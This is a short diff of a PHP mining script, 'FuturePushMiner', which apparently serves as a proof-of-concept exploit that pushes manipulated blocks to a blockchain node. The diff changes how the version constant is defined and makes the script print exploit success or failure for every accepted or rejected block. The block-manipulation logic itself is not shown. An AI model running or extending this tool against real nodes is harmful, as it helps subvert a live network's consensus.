@@ -1,13 +1,15 @@
 <?php
 if(php_sapi_name() !== 'cli') exit;
 const DEFAULT_CHAIN_ID = "01";
-const MINER_VERSION = "1.6.8";
-const VERSION = "1.6.8";
 if(Phar::running()) {
 	require_once 'vendor/autoload.php';
 } else {
 	require_once dirname(__DIR__).'/vendor/autoload.php';
 }
+if(!defined("MINER_VERSION")) {
+    define("MINER_VERSION", "1.6.8");
+}
+
 
 class FuturePushMiner extends Miner
 {
@@ -264,15 +266,11 @@ class FuturePushMiner extends Miner
             if ($accepted) {
                 _log("Block confirmed", 1);
                 $this->miningStat['accepted']++;
-                 if ($is_future_push_submission) {
-                    echo "[+] Exploit successful! The manipulated block was accepted by the node." . PHP_EOL;
-                }
+                echo "[+] Exploit successful! The manipulated block was accepted by the node." . PHP_EOL;
             } else {
                 _log("Block not confirmed: " . $res, 1);
                 $this->miningStat['rejected']++;
-                if ($is_future_push_submission) {
-                    echo "[-] Exploit failed. The manipulated block was rejected by the node." . PHP_EOL;
-                }
+                echo "[-] Exploit failed. The manipulated block was rejected by the node." . PHP_EOL;
             }
 
             sleep(3);
